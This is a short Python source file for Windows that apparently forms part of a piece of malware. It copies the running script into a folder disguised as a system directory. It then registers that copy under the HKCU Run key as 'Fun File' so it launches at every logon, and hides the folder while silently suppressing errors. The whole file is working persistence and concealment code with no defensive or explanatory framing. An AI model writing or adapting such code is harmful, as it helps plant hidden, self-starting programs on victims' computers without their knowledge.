import os
import sys
import shutil
from _winreg import *
import ctypes

def hideFolder():
	FILE_ATTRIBUTE_HIDDEN = 0x02

	ret = ctypes.windll.kernel32.SetFileAttributesW(ur"C:\Windows Files", FILE_ATTRIBUTE_HIDDEN)
	try:
		if not ret:
			raise ctypes.WinError()
	except:
		pass



def addStartup(file_name):
	print file_name
	temp = file_name.split("\\")
	if len(temp) < 1:
		temp = file_name.split("/")
	file_name = temp[-1]
	print file_name
	keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
	directory_name = r"C:\Windows Files\system 32\drivers\etc\files\host"
	key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)

	SetValueEx(key2change, "Fun File", 0, REG_SZ, directory_name+"\\"+file_name)


def replicate():
	directory_name = r"C:\Windows Files\system 32\drivers\etc\files\host"
	file_path = sys.argv
	if not os.path.exists(directory_name):
		os.makedirs(directory_name)
	temp = file_path[0].split("/")
	if len(temp) < 1:
		temp = file_path[0].split("\\")
	file_name = temp[-1]
	path = "\\".join(temp)
	try:
		shutil.copy2(path, directory_name)       # copy the file to location
		addStartup(directory_name+"\\"+file_name)       # add to startup.
		hideFolder()                # Hides the fucking folder.
	except:
		pass
